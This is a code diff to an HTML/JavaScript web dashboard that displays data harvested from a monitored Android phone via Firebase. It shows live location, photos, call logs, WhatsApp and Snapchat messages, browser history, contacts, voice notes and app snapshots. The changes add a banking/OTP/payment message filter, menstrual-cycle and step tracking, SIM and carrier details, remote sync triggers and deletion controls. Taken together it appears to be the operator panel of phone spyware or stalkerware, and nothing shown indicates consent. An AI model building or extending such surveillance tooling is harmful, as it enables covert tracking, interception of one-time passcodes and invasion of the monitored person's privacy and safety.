@@ -195,6 +195,23 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 .wifi-prev-header:hover{color:var(--accent)}
 .wifi-prev-body{overflow:hidden;transition:max-height .2s}
 .wifi-prev-body.closed{max-height:0!important}
+/* Skeleton loading */
+@keyframes shimmer{0%{background-position:-200px 0}100%{background-position:calc(200px + 100%) 0}}
+.skel{background:linear-gradient(90deg,var(--card) 25%,var(--border) 50%,var(--card) 75%);background-size:200px 100%;animation:shimmer 1.5s infinite;border-radius:4px}
+.skel-line{height:14px;margin-bottom:8px;width:100%}
+.skel-line.w50{width:50%}
+.skel-line.w30{width:30%}
+.skel-block{height:80px;width:100%;margin-bottom:8px}
+.skel-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.skel-card{background:var(--card);border-radius:var(--radius);padding:12px;border-left:3px solid var(--border)}
+/* Canvas chart container */
+canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6px;margin:4px 0}
+/* Search bar */
+.global-search{display:flex;align-items:center;gap:6px;margin-left:auto}
+.global-search input{padding:5px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;width:160px;transition:border-color .15s}
+.global-search input:focus{outline:none;border-color:var(--accent);width:220px}
+.global-search input::placeholder{color:var(--muted);font-size:11px}
+@media(max-width:720px){.global-search{width:100%;margin:4px 0 0}.global-search input{width:100%}.global-search input:focus{width:100%}}
 </style>
 </head>
 <body>
@@ -204,26 +221,28 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <span class="status" id="statusDot">&#x25CF; Live</span>
 <span class="read-budget" id="readBudget"></span>
 <span class="read-budget" id="queueBadge" style="color:var(--accent);cursor:pointer;margin-left:6px" title="Pending offline queue size">&#x1F4E2; 0</span>
+<div class="global-search"><input type="text" id="globalSearch" placeholder="&#x1F50D; Search all data..." title="Search across all tabs"></div>
 </div>
 <div class="alert-banner" id="alertBanner"></div>
 <div class="sidebar">
 <div class="tabs" id="tabBar">
 <button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
+<button class="tab-btn" data-tab="recents">&#x23F1; Recents</button>
 <button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
 <button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
 <button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
 <button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
-<button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
-<button class="tab-btn" data-tab="fcm">&#x1F4E1; Sync</button>
-<button class="tab-btn" data-tab="contacts">&#x1F4CD; Contacts</button>
+<button class="tab-btn" data-tab="health">&#x1F4AA; Health</button>
+<button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
 <button class="tab-btn" data-tab="voice">&#x1F3A4; Voice</button>
 <button class="tab-btn" data-tab="playback">&#x25B6; Playback</button>
-<button class="tab-btn" data-tab="insights">&#x1F4CA; Insights</button>
-<button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
+<button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
 <button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
 <button class="tab-btn" data-tab="permissions">&#x1F512; Perms</button>
 <button class="tab-btn" data-tab="wifi">&#x1F4E1; WiFi</button>
 <button class="tab-btn" data-tab="logcat">&#x1F4DD; Logcat</button>
+<button class="tab-btn" data-tab="contacts">&#x1F4CD; Contacts</button>
+<button class="tab-btn" data-tab="insights">&#x1F4CA; Insights</button>
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
@@ -245,8 +264,49 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
   <div style="display:flex;gap:12px;flex-wrap:wrap;font-size:12px">
     <div><span class="label" style="font-size:10px">Active App</span><br><span id="activeAppVal" style="font-weight:500">--</span></div>
     <div><span class="label" style="font-size:10px">Last Screen On</span><br><span id="lastScreenOnVal" style="font-weight:500">--</span></div>
+    <div><span class="label" style="font-size:10px">Steps Today</span><br><span id="liveStepsVal" style="font-weight:500">--</span></div>
+    <div><span class="label" style="font-size:10px">Carrier</span><br><span id="liveCarrierVal" style="font-weight:500">--</span></div>
+    <div><span class="label" style="font-size:10px">Network</span><br><span id="liveNetworkVal" style="font-weight:500">--</span></div>
+    <div><span class="label" style="font-size:10px">SIM</span><br><span id="liveSimVal" style="font-weight:500">--</span></div>
   </div>
 </div>
+<div id="statusWidget" style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap;font-size:10px">
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swBattery">&#x1F50B; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swStorage">&#x1F4BE; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swSteps">&#x1F45F; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swWifi">&#x1F4E1; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swSignal">&#x1F4F6; --</span>
+</div>
+<div class="card" style="border-left-color:var(--accent);margin-top:12px;padding:12px">
+  <div style="font-size:13px;font-weight:500;margin-bottom:8px">&#x1F4E1; Sync Controls</div>
+  <div style="font-size:11px;color:var(--muted);margin-bottom:8px">Trigger immediate sync or enable auto-sync on the device.</div>
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
+    <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:11px" onclick="sendFcmPush()">&#x1F504; Trigger Sync Now</button>
+    <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:11px" onclick="toggleAutoFcm()" id="autoFcmBtn">&#x23F1; Auto-Sync: OFF</button>
+  </div>
+  <div style="font-size:10px;color:var(--muted)" id="fcmTokenInfo">No FCM token registered yet</div>
+  <div style="font-size:10px;color:var(--muted);margin-top:4px" id="fcmLastPush">Last trigger: --</div>
+</div>
+<div class="card" style="border-left-color:var(--success);margin-top:8px;padding:12px">
+  <div style="font-size:13px;font-weight:500;margin-bottom:4px">&#x1F4E2; Offline Queue</div>
+  <div style="font-size:11px;color:var(--muted);margin-bottom:6px">Location data buffered on device when offline — flushed to RTDB every 5min when connected</div>
+  <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap">
+    <span style="font-size:20px;font-weight:700;color:var(--accent)" id="offlineQueueCount">--</span>
+    <span style="font-size:11px;color:var(--muted)">pending entries</span>
+  </div>
+</div>
+</div>
+<div id="tab-recents">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
+<span style="font-size:14px;font-weight:500">&#x23F1; App Snapshots <span id="recentsCount" style="font-weight:400;color:var(--muted);font-size:12px"></span></span>
+<div style="display:flex;align-items:center;gap:6px">
+<label style="display:flex;align-items:center;gap:4px;font-size:11px;color:var(--muted);cursor:pointer">
+<input type="checkbox" id="recentsDedupToggle" checked> Dedup (1s)
+</label>
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollAppSnapshots()">&#x1F504; Refresh</span>
+</div>
+</div>
+<div id="recentsList"><div class="label">Click Refresh to load app snapshots</div></div>
 </div>
 <div id="tab-photos">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
@@ -264,8 +324,25 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <span class="chip active" data-filter="all" data-label="All">All</span>
 <span class="chip" data-filter="location" data-label="&#x1F4CD; Location">&#x1F4CD; Location</span>
 <span class="chip" data-filter="call" data-label="&#x1F4DE; Call">&#x1F4DE; Call</span>
-<span class="chip" data-filter="whatsapp" data-label="&#x1F4AC; WhatsApp">&#x1F4AC; WhatsApp</span>
+<span class="chip" data-filter="whatsapp_individual" data-label="&#x1F4AC; Individual">&#x1F4AC; Individual</span>
+<span class="chip" data-filter="whatsapp_group" data-label="&#x1F465; Groups">&#x1F465; Groups</span>
 <span class="chip" data-filter="snapchat" data-label="&#x1F4F8; Snapchat">&#x1F4F8; Snapchat</span>
+<span class="chip" data-filter="banking" data-label="&#x1F4B3; Banking">&#x1F4B3; Banking</span>
+</div>
+<div style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
+<select id="timelinePeriod" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:var(--radius);font-size:11px">
+<option value="all">All Time</option>
+<option value="1h">Last 1 Hour</option>
+<option value="6h">Last 6 Hours</option>
+<option value="12h">Last 12 Hours</option>
+<option value="24h" selected>Last 24 Hours</option>
+<option value="7d">Last 7 Days</option>
+<option value="30d">Last 30 Days</option>
+</select>
+<label style="display:flex;align-items:center;gap:4px;font-size:11px;color:var(--muted);cursor:pointer">
+<input type="checkbox" id="dedupToggle"> Dedup (10s)
+</label>
+<button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:10px" onclick="clearTimeline()">&#x1F5D1; Clear Timeline</button>
 </div>
 <input type="text" id="timelineSearch" placeholder="&#x1F50D; Search contacts, numbers, messages..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:8px">
 <div id="timelineList"></div>
@@ -275,8 +352,9 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <span class="app-period-btn active" data-period="today">Today</span>
 <span class="app-period-btn" data-period="yesterday">Yesterday</span>
 <span class="app-period-btn" data-period="week">7-day avg</span>
-<span class="app-period-btn" data-period="mostRecent">⏱ Recent</span>
-  </div><div style="font-size:10px;color:var(--muted);margin-bottom:6px" id="appsSyncInfo"></div><div id="appsChart"></div></div>
+  </div><div style="font-size:10px;color:var(--muted);margin-bottom:6px" id="appsSyncInfo"></div>
+  <div id="appsChart"></div>
+</div>
 <div id="tab-geofence">
 <div class="card" style="border-left-color:var(--accent);padding:12px;margin-bottom:10px">
   <div style="font-size:13px;font-weight:500;margin-bottom:6px">&#x1F3E0; Home Location</div>
@@ -287,26 +365,6 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
   </div>
 </div>
 <div id="geofenceList"></div></div>
-<div id="tab-fcm">
-<div class="card" style="border-left-color:var(--accent);padding:12px">
-  <div style="font-size:13px;font-weight:500;margin-bottom:8px">&#x1F4E1; Remote Sync Trigger</div>
-  <div style="font-size:11px;color:var(--muted);margin-bottom:8px">Writes a sync request flag to the device's RTDB path. The foreground service picks it up within 15 seconds and runs an immediate full sync.</div>
-  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
-    <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:11px" onclick="sendFcmPush()">&#x1F504; Trigger Sync Now</button>
-    <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:11px" onclick="toggleAutoFcm()" id="autoFcmBtn">&#x23F1; Auto-Sync: OFF</button>
-  </div>
-  <div style="font-size:10px;color:var(--muted)" id="fcmTokenInfo">No FCM token registered yet</div>
-  <div style="font-size:10px;color:var(--muted);margin-top:4px" id="fcmLastPush">Last trigger: --</div>
-</div>
-<div class="card" style="border-left-color:var(--success);padding:12px;margin-top:8px">
-  <div style="font-size:13px;font-weight:500;margin-bottom:4px">&#x1F4E2; Offline Queue</div>
-  <div style="font-size:11px;color:var(--muted);margin-bottom:6px">Location data buffered on device when offline — flushed to RTDB every 5min when connected</div>
-  <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap">
-    <span style="font-size:20px;font-weight:700;color:var(--accent)" id="offlineQueueCount">--</span>
-    <span style="font-size:11px;color:var(--muted)">pending entries</span>
-  </div>
-</div>
-</div>
 <div id="tab-contacts">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
   <span style="font-size:14px;font-weight:500">&#x1F4CD; Contacts</span>
@@ -341,7 +399,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
   <span style="font-size:14px;font-weight:500">&#x1F4E6; Storage & Cleanup</span>
   <span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="refreshStorage()">&#x1F504; Refresh</span>
 </div>
-<div id="storageOverview" style="margin-bottom:14px"></div>
+<div id="storageOverview" style="margin-bottom:14px"><div class="skel skel-block"></div><div class="skel skel-line w50"></div></div>
 <div style="border-top:1px solid var(--border);padding-top:10px">
   <div style="font-size:13px;font-weight:500;margin-bottom:8px">&#x1F9F9; Cleanup Actions</div>
   <div id="cleanupActions" style="display:flex;flex-direction:column;gap:6px"></div>
@@ -401,6 +459,50 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <input type="text" id="logcatSearch" placeholder="&#x1F50D; Search..." style="flex:1;min-width:150px;padding:6px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;font-size:11px">
 </div>
 <div id="logcatContent" style="font-family:monospace;font-size:10px;line-height:1.4;max-height:60vh;overflow-y:auto;background:#0d1117;padding:8px;border-radius:6px;border:1px solid var(--border)"><div class="label" style="color:var(--muted)">Click Refresh to load logcat</div></div>
+</div>
+<div id="tab-health">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
+<span style="font-size:14px;font-weight:500">&#x1F4AA; Health</span>
+<div style="display:flex;gap:6px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollHealth()">&#x1F504; Refresh</span>
+</div>
+</div>
+<div style="display:flex;gap:8px;flex-wrap:wrap">
+<div class="card" style="flex:1;min-width:200px;border-left-color:var(--accent)">
+<div class="label">&#x1F45F; Steps Today</div>
+<div style="font-size:28px;font-weight:700" id="healthSteps">--</div>
+<div style="font-size:12px;color:var(--muted)" id="healthStepsGoal">Goal: --</div>
+<div style="margin-top:6px;height:6px;background:var(--border);border-radius:3px;overflow:hidden">
+<div id="healthStepsBar" style="height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--success));border-radius:3px;transition:width 0.5s"></div>
+</div>
+</div>
+<div class="card" style="flex:1;min-width:200px;border-left-color:var(--info)">
+<div class="label">&#x1F3C3; Current Activity</div>
+<div style="font-size:22px;font-weight:700" id="healthActivity">--</div>
+<div style="font-size:12px;color:var(--muted)" id="healthActivityConfidence">--</div>
+</div>
+</div>
+<div style="margin-top:12px">
+<div class="label">&#x1F4C5; Step History (Last 7 Days) <span style="font-weight:400;color:var(--muted);font-size:11px;cursor:pointer" onclick="exportStepChart()">&#x1F4E5; Export</span></div>
+<canvas id="healthStepCanvas" class="chart-canvas"></canvas>
+</div>
+<div style="margin-top:12px">
+<div class="label">&#x1F3C3; Activity Timeline</div>
+<div id="healthActivityTimeline" style="max-height:200px;overflow-y:auto;margin-top:4px">
+<div class="label" style="color:var(--muted)">No activity data yet</div>
+</div>
+</div>
+<div style="margin-top:16px" id="haidhSection">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+<span class="label">&#x1F4B8; Menstrual Cycle</span>
+<span id="haidhLastSync" style="font-size:10px;color:var(--muted)"></span>
+</div>
+<div id="haidhSummary" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px;margin-bottom:12px"></div>
+<div style="margin-top:12px">
+<div class="label">&#x1F4C5; Cycle Calendar (Last 6 Months)</div>
+<canvas id="haidhCalendarCanvas" class="chart-canvas" height="200"></canvas>
+</div>
+</div>
 </div>
 <div id="tab-playback">
 <div class="pb-stats" id="pbStats" style="display:none">
@@ -790,7 +892,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     btn.classList.add('active');
     document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
     toggleMap(MAP_TABS.has(btn.dataset.tab));
-    if (btn.dataset.tab === 'playback') {
+if (btn.dataset.tab === 'playback') {
       if (!historyAutoLoaded && !locationHistory.length) {
         historyAutoLoaded = true;
         loadDefaultHistory();
@@ -804,7 +906,29 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'photos') pollPhotos();
     if (btn.dataset.tab === 'wifi') pollWifiScans();
     if (btn.dataset.tab === 'logcat') pollLogcat();
+    if (btn.dataset.tab === 'health') pollHealth();
+    if (btn.dataset.tab === 'voice') pollVoiceNotes();
+    if (btn.dataset.tab === 'recents') pollAppSnapshots();
   });
+});
+
+// --- Keyboard Shortcuts ---
+document.addEventListener('keydown', e => {
+  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') return;
+  const tab = e.key;
+  if (tab >= '1' && tab <= '9') {
+    const btns = document.querySelectorAll('.tab-btn');
+    const idx = parseInt(tab) - 1;
+    if (btns[idx]) btns[idx].click();
+    return;
+  }
+  const shortcuts = { 'h': 'health', 'p': 'photos', 'v': 'voice', 'l': 'live', 's': 'storage', 't': 'timeline', 'a': 'apps', 'r': 'recents', 'g': 'geofence', 'w': 'wifi', 'b': 'browser', 'c': 'calls', 'o': 'contacts' };
+  if (shortcuts[e.key.toLowerCase()]) {
+    document.querySelector('[data-tab="' + shortcuts[e.key.toLowerCase()] + '"]')?.click();
+  }
+  if (e.key === 'Escape') {
+    document.getElementById('lightbox')?.classList.remove('open');
+  }
 });
 
 // --- Tab-aware polling ---
@@ -873,6 +997,7 @@ function startPolling() {
   schedulePoll('insights', 120000, renderInsights);
   schedulePoll('wifi', 60000, pollWifiScans);
   schedulePoll('logcat', 60000, pollLogcat);
+  schedulePoll('health', 60000, pollHealth);
 }
 
 function schedulePoll(name, interval, fn) {
@@ -884,7 +1009,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat()];
+  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollHaidh()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -1007,6 +1132,10 @@ async function pollMeta() {
   document.getElementById('batVal').textContent = (m.batteryPct || '--') + '%' + (m.isCharging ? ' \u26A1' : '');
   document.getElementById('wifiVal').textContent = m.wifiSsid || '--';
   document.getElementById('devVal').textContent = m.deviceModel || '--';
+  document.getElementById('liveStepsVal').textContent = m.stepsToday ? m.stepsToday.toLocaleString() : '--';
+  document.getElementById('liveCarrierVal').textContent = m.networkOperatorName || m.networkOperator || '--';
+  document.getElementById('liveNetworkVal').textContent = m.networkTypeDetail || '--';
+  document.getElementById('liveSimVal').textContent = m.simCountryIso ? m.simCountryIso.toUpperCase() : '--';
   if (m.deviceModel && devices[selectedDevice]) {
     const label = [m.manufacturer, m.deviceModel].filter(Boolean).join(' ');
     devices[selectedDevice].label = label;
@@ -1032,6 +1161,34 @@ async function pollMeta() {
     document.getElementById('statusDot').textContent = '\u25CF Live';
     document.getElementById('statusDot').className = 'status';
   }
+  // Status widget
+  const swBat = document.getElementById('swBattery');
+  if (swBat) {
+    const pct = m.batteryPct;
+    const charging = m.isCharging ? ' ⚡' : '';
+    swBat.textContent = '\u{1F50B} ' + (pct != null ? pct + '%' + charging : '--');
+    swBat.style.borderColor = pct != null && pct < 20 ? 'var(--danger)' : 'var(--border)';
+    swBat.style.color = pct != null && pct < 20 ? 'var(--danger)' : 'var(--muted)';
+  }
+  const swStorage = document.getElementById('swStorage');
+  if (swStorage) {
+    const freeGb = m.storageFreeGb;
+    swStorage.textContent = '\u{1F4BE} ' + (freeGb != null ? freeGb.toFixed(1) + 'GB free' : '--');
+    swStorage.style.borderColor = freeGb != null && freeGb < 2 ? 'var(--danger)' : 'var(--border)';
+  }
+  const swSteps = document.getElementById('swSteps');
+  if (swSteps && m.stepsToday != null) {
+    const steps = m.stepsToday;
+    const goal = m.stepsGoal || 8000;
+    swSteps.textContent = '\u{1F45F} ' + steps.toLocaleString() + '/' + goal.toLocaleString();
+    swSteps.style.borderColor = steps >= goal ? 'var(--success)' : 'var(--border)';
+    swSteps.style.color = steps >= goal ? 'var(--success)' : 'var(--muted)';
+  }
+  const swWifi = document.getElementById('swWifi');
+  if (swWifi && m.wifiSsid) swWifi.textContent = '\u{1F4E1} ' + m.wifiSsid;
+  if (swWifi && !m.wifiSsid) swWifi.textContent = '\u{1F4E1} Mobile';
+  const swSignal = document.getElementById('swSignal');
+  if (swSignal) swSignal.textContent = '\u{1F4F6} ' + (m.networkType || '--');
 }
 
 // --- Photos (Lazy Load) ---
@@ -1105,7 +1262,9 @@ function renderPhotosFromCache() {
       html += '<div class="pwrap" data-ts="' + ts + '" onclick="openPhotoLightbox(this)">' +
         '<img src="data:image/jpeg;base64,' + doc.data + '" loading="lazy" decoding="async">' +
         '<div class="pcap"><div>' + escHtml(fileName || dateTaken || synced) + '</div>' +
-        '<div class="ptime">' + (dateTaken ? dateTaken + ' &middot; ' : '') + synced + '</div></div></div>';
+        '<div class="ptime">' + (dateTaken ? dateTaken + ' &middot; ' : '') + synced + '</div></div>' +
+        '<button class="chip" style="position:absolute;top:4px;right:4px;background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;z-index:10" onclick="event.stopPropagation();deletePhoto(' + ts + ')">Delete</button>' +
+        '</div>';
     }
     html += '</div></div>';
   }
@@ -1291,11 +1450,6 @@ function renderApps(sorted) {
   const chart = document.getElementById('appsChart');
   const syncEl = document.getElementById('appsSyncInfo');
   const period = document.querySelector('.app-period-btn.active')?.dataset?.period || 'today';
-  // If mostRecent is selected, render from snapshot cache instead
-  if (period === 'mostRecent') {
-    renderAppSnapshots();
-    return;
-  }
   if (!sorted || !sorted.length) {
     chart.innerHTML = '<div class="label">No app usage data yet</div>';
     if (syncEl) syncEl.textContent = '';
@@ -1351,10 +1505,11 @@ function renderAppSnapshots() {
     if (syncEl) syncEl.textContent = '';
     return;
   }
-  // Dedup: keep only first entry per (appName, phoneTsMs)
+  // Dedup: keep only first entry per (appName, 1-second time window)
   const seen = new Set();
   const deduped = appSnapshotsCache.filter(s => {
-    const key = s.appName + '|' + s.phoneTsMs;
+    const timeBucket = Math.floor(s.phoneTsMs / 1000); // 1-second window
+    const key = s.appName + '|' + timeBucket;
     if (seen.has(key)) return false;
     seen.add(key);
     return true;
@@ -1376,6 +1531,50 @@ function renderAppSnapshots() {
   chart.innerHTML = html;
 }
 
+function renderRecents() {
+  const list = document.getElementById('recentsList');
+  const countEl = document.getElementById('recentsCount');
+  if (!appSnapshotsCache || !appSnapshotsCache.length) {
+    list.innerHTML = '<div class="label">No app snapshots yet. Captured every 30s by the phone.</div>';
+    if (countEl) countEl.textContent = '';
+    return;
+  }
+  // Dedup toggle persisted in localStorage (default ON)
+  const dedupEnabled = localStorage.getItem('recentsDedup') !== 'false';
+  document.getElementById('recentsDedupToggle').checked = dedupEnabled;
+
+  let deduped = appSnapshotsCache;
+  if (dedupEnabled) {
+    const seen = new Set();
+    deduped = appSnapshotsCache.filter(s => {
+      const timeBucket = Math.floor(s.phoneTsMs / 1000);
+      const key = s.appName + '|' + timeBucket;
+      if (seen.has(key)) return false;
+      seen.add(key);
+      return true;
+    });
+  }
+
+  if (countEl) {
+    countEl.innerHTML = '<span style="color:var(--muted)">Raw: ' + appSnapshotsCache.length + '</span> \u2022 <span style="color:var(--success)">Deduped: ' + deduped.length + '</span>';
+  }
+
+  let html = '';
+  for (const s of deduped) {
+    html += '<div class="bar-row" style="padding:3px 6px;gap:8px">' +
+      '<span style="font-size:11px;font-weight:500;min-width:60px;flex-shrink:0">' + s.appName + '</span>' +
+      '<span style="font-size:10px;color:var(--muted);white-space:nowrap">' +
+      '\u{1F4F1} ' + pktShort(s.phoneTsMs) + ' \u{1F504} ' + pktShort(s.dashboardTsMs) +
+      '</span></div>';
+  }
+  list.innerHTML = html || '<div class="label">No snapshots after dedup</div>';
+}
+
+document.getElementById('recentsDedupToggle')?.addEventListener('change', function() {
+  localStorage.setItem('recentsDedup', this.checked);
+  if (appSnapshotsCache) renderRecents();
+});
+
 async function pollAppSnapshots() {
   if (!selectedDevice) return;
   const data = await fetchRTDB(`devices/${selectedDevice}/appSnapshots`);
@@ -1395,9 +1594,10 @@ async function pollAppSnapshots() {
     }))
     .filter(s => s.phoneTsMs > 0)
     .sort((a, b) => b.phoneTsMs - a.phoneTsMs)
-    .slice(0, 100);
+.slice(0, 500);
   appSnapshotsLastSync = Date.now();
   renderAppSnapshots();
+  renderRecents();
 }
 
 async function pollApps() {
@@ -1450,9 +1650,11 @@ async function pollVoiceNotes() {
     const batch = data[key];
     if (!batch || typeof batch !== 'object') continue;
     const synced = parseInt(batch.ts_ms) || 0;
-    for (const note of (batch.notes || [])) {
+    const batchNotes = batch.notes || [];
+    for (let i = 0; i < batchNotes.length; i++) {
+      const note = batchNotes[i];
       if (!note) continue;
-      notes.push(Object.assign({ _synced: synced }, note));
+      notes.push(Object.assign({ _synced: synced, _batchKey: key, _batchIndex: i }, note));
     }
   }
   // Newest created/captured first.
@@ -1503,7 +1705,7 @@ let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${n
       audioStatus = '<span class="vmeta" style="color:var(--muted);margin-left:8px">\u25CF Unavailable</span>';
     }
     html += `<div class="voice-card">
-      <div class="vname">${name} ${audioStatus}${downloadLink}</div>
+      <div class="vname">${name} ${audioStatus}${downloadLink}<button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteVoiceNote('${key}', ${note._batchIndex})">Delete</button></div>
       ${meta ? `<div class="vmeta">${meta}</div>` : ''}
       ${syncedLine}
       ${player}
@@ -1643,6 +1845,22 @@ function updateMap(loc) {
   if (locationHistory.length > 500) locationHistory.shift();
   updateTrail();
   if (locationHistory.length === 1) map.setView(latlng, 15);
+}
+
+// --- Timeline Map Pins ---
+const timelinePins = L.layerGroup().addTo(map);
+function flyToLocation(lat, lng, label) {
+  map.setView([lat, lng], 16, { animate: true, duration: 0.5 });
+  timelinePins.clearLayers();
+  const pin = L.marker([lat, lng], {
+    icon: L.divIcon({
+      className: '',
+      html: '<div style="background:#ffca28;width:12px;height:12px;border-radius:50%;border:2px solid #fff;box-shadow:0 0 8px rgba(255,202,40,.8)"></div>',
+      iconSize: [12, 12],
+      iconAnchor: [6, 6]
+    })
+  }).addTo(timelinePins).bindPopup(label || 'Timeline location');
+  pin.openPopup();
 }
 
 // --- Gradient Trail ---
@@ -2101,14 +2319,27 @@ function jumpToPoint(idx) {
 
 // --- Timeline ---
 let timelineFilter = 'all';
+let timelineOffset = 0;
+const TIMELINE_BATCH = 200;
+let timelineLoading = false;
 document.querySelectorAll('.chip[data-filter]').forEach(chip => {
   chip.addEventListener('click', () => {
     document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
     chip.classList.add('active');
     timelineFilter = chip.dataset.filter;
+    timelineOffset = 0;
     if (timelineCache) renderTimeline(timelineCache);
     else pollHistory();
   });
+});
+document.getElementById('timelinePeriod')?.addEventListener('change', () => {
+  timelineOffset = 0;
+  if (timelineCache) renderTimeline(timelineCache);
+  else pollHistory();
+});
+document.getElementById('dedupToggle')?.addEventListener('change', () => {
+  if (timelineCache) renderTimeline(timelineCache);
+  else pollHistory();
 });
 
 function renderTimeline(docs) {
@@ -2118,33 +2349,66 @@ function renderTimeline(docs) {
     const type = (d.type || '').toLowerCase();
     if (type === 'location') counts.location = (counts.location || 0) + 1;
     if (type.includes('call')) counts.call = (counts.call || 0) + 1;
-    if (type.includes('whatsapp') || type.includes('message')) counts.whatsapp = (counts.whatsapp || 0) + 1;
+    if (type.includes('whatsapp') || type.includes('message')) {
+      counts.whatsapp = (counts.whatsapp || 0) + 1;
+      if (d.isGroup === true) counts.whatsapp_group = (counts.whatsapp_group || 0) + 1;
+      else counts.whatsapp_individual = (counts.whatsapp_individual || 0) + 1;
+    }
     if (type.includes('snapchat')) counts.snapchat = (counts.snapchat || 0) + 1;
+    if (type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction')) {
+      counts.banking = (counts.banking || 0) + 1;
+    }
   }
   document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     const f = chip.dataset.filter;
     chip.textContent = chip.dataset.label + (counts[f] !== undefined ? ' (' + counts[f] + ')' : '');
   });
-  const filtered = docs.filter(d => {
+
+  const periodSel = document.getElementById('timelinePeriod')?.value || 'all';
+  const periodMs = { '1h': 3600000, '6h': 21600000, '12h': 43200000, '24h': 86400000, '7d': 604800000, '30d': 2592000000 };
+  const now = Date.now();
+  const cutoff = periodSel === 'all' ? 0 : now - (periodMs[periodSel] || 0);
+
+  let filtered = docs.filter(d => {
     const type = (d.type || '').toLowerCase();
+    const ts = parseInt(d.ts_ms || '0');
+    if (cutoff && ts < cutoff) return false;
     if (timelineFilter === 'all') return true;
     if (timelineFilter === 'location') return type === 'location';
     if (timelineFilter === 'call') return type.includes('call');
-    if (timelineFilter === 'whatsapp') return type.includes('whatsapp') || type.includes('message');
+    if (timelineFilter === 'whatsapp_individual') return (type.includes('whatsapp') || type.includes('message')) && d.isGroup !== true;
+    if (timelineFilter === 'whatsapp_group') return (type.includes('whatsapp') || type.includes('message')) && d.isGroup === true;
     if (timelineFilter === 'snapchat') return type.includes('snapchat');
